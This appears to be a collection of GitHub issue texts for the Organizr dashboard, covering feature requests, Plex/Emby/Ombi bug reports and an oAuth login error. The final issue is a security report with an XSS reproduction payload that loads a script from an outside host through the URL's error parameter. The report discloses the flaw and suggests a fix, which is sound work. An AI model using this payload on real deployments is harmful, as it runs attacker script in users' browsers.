So, when you send an invite out to someone through the Plex interface it generates a direct accept URL, were the server owner can give the person being referred the URL, and he/she can go to the URL sign in and have the library automatically added.

So, I'm wondering if it's possible to grab that url, server side, pass the login info the user provided when using the invite code for Organizr to Plex and auto accept that invite? This would cut out the extra step of the individual accepting it through Plex.tv and then coming back to Organizr. Especially useful for users who don't know how Plex works or for the lazies.

I'm guessing this isn't gonna be possible but, just throwing it out there.

<!---TYPE HERE--->
Since update, the part where it shows Recently Added is not showing new movies.  It still shows new shows and music.  It was working prior to update.  Clicked on the filter, and it is only showing All, Shows, Music.  I am using Emby v4.4.0.7; same issue with v4.4.0.5.  Disabled Emby-Jellyfin from Settings / Homepage Items, and re-enabled; same issue.  Tried it on Chrome and Firefox; same issue.

Basically the Ombi homepage plugin has an ability to search for movies/shows which is currently only visible to the admin. I've tried changing the settings within the plugin to show for Users+, tested all groups from Co-Admin down. Even with a Co-Admin account, the search option still won't appear.
So, in the calendar week view, basically keep the current day highlighted in the middle and have the previous days slide to the left, 3 days until it disappears and have new days coming from the right, 3 days in advance.

Would be sweet if this is possible, because right now Sunday's slot is never visible until Sunday at midnight.
and is it possible with a custom css to remove github and disweb.deploys.io button ?

I'm also looking to move the top bar and integrate it on the sidebar.

##### Problem Description:
When using Plex oAuth for authentication I very often have to hit the login button more than once before oAuth connectivity is successfully established.

On first/second the Plex login popup window very briefly opens (for less than a second) and then immediately closes followed by a toast message on the Organizr page stating "Error Connecting to oAuth Provider".

A second or third attempt allows the Plex oAuth login screen to open successfully and proceed with login as normal.

It's very inconsistent - sometimes it will work fine on first attempt, but mostly it'll require hitting the login button 2/3/4 times.

Clearly as all works fine on the second or third attempt this is very low priority/impact.
However it would be interesting to understand more as to why this behaviour is happening and how it might be mitigated so that it consistently works the first time.

Are there any logs that might provide more details surrounding that error?
<hr>

##### Reproduction Steps:
<!---TYPE HERE--->
 - Authentication Type: Organizr DB + Backend
 - Authentication Backend: Plex
 - Enable Plex oAuth: Enabled
 - Minimal Login Screen: Enabled
 - All pages/tabs of organizr configured to require minimum of 'User' permissions to view. Therefore when browsing to organizr while logged-out it defaults to the login page.
(If any relevant config is missing here please let me know)

1) Browse to organizr while not logged in. Defaults to login screen.
2) Select login with Plex auth
3) Hit login button on organizr page (onclick="oAuthStart('plex')")
Often the first/second attempt results in error "Error Connecting to oAuth Provider".
4) Hitting login 2-3 times allows Plex auth popup window to load successfully and allow user to enter login details and continue normally.

Idea:

How about under the information section, making the Branch into a link that leads to that version's "change log". i.e. Mine says v2-develop, make that into a link that leads to https://github.com/causefx/Organizr/commits/v2-develop

for quick access to see what the latest changes are?

##### Problem Description:
Organizr is vulnerable to XSS attacks
This is a pretty serious security concern for users. 
Suggest supporting Content-Security-Policy: script-src 'self' and relying less on inline scripts.
<hr>

##### Reproduction Steps:
For example append ?error=<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT> to the URL of a hosted organizr setup.
